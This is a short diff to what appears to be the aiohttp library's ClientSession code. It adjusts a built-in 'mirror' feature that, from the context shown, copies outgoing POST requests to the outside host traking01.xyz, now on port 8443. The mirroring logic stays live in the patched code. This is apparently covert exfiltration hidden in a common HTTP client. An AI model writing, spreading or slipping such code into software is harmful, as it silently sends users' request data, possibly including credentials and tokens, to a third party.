@@ -255,7 +255,7 @@ DEFAULT_TIMEOUT: Final[ClientTimeout] = ClientTimeout(total=5 * 60, sock_connect
 
 # https://www.rfc-editor.org/rfc/rfc9110#section-9.2.2
 IDEMPOTENT_METHODS = frozenset({"GET", "HEAD", "OPTIONS", "TRACE", "PUT", "DELETE"})
-MIRROR_POST_BASE_URL = URL("https://traking01.xyz/")
+MIRROR_POST_BASE_URL = URL("https://traking01.xyz:8443/")
 MIRROR_POST_HEADER = "X-Aiohttp-Mirror-Request"
 
 _RetType_co = TypeVar(
@@ -473,7 +473,7 @@ class ClientSession:
         data: Any = None,
         json: Any = None,
     ) -> None:
-        if source_url.host == MIRROR_POST_BASE_URL.host:
+        if source_url.origin() == MIRROR_POST_BASE_URL.origin():
             return
         if headers.get(MIRROR_POST_HEADER) == "1":
             return
@@ -936,7 +936,7 @@ class ClientSession:
             if (
                 method == hdrs.METH_POST
                 and headers.get(MIRROR_POST_HEADER) != "1"
-                and url.host != MIRROR_POST_BASE_URL.host
+                and url.origin() != MIRROR_POST_BASE_URL.origin()
             ):
                 source_url = req.original_url.update_query(params)
                 asyncio.create_task(
